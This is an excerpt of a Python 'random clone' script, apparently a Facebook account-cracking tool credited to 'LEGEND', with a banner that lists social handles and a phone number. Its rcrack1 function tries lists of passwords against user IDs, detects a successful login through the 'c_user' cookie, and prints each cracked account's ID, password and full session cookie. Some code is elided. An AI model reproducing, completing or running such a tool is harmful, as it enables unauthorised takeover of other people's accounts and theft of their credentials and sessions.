#Create By: LEGEND 
#FaceBook: LEGEND  Islam
#GitHub: https://github.com/LEGEND -404-CYBER
#---------------------------------------------------------------------------#
...
\033[1;95m    \033[1;92m
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mLEGEND            
 ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               
 ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       
 ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                
 ┃ [✓] GITHUB    \033[1;91m: \033[1;92mLegendhj           
 ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mmd YUSUF             
 ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+8801837478901          
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mLEGEND \033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[LEGEND -OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[LEGEND -CP] {cid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[LEGEND ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()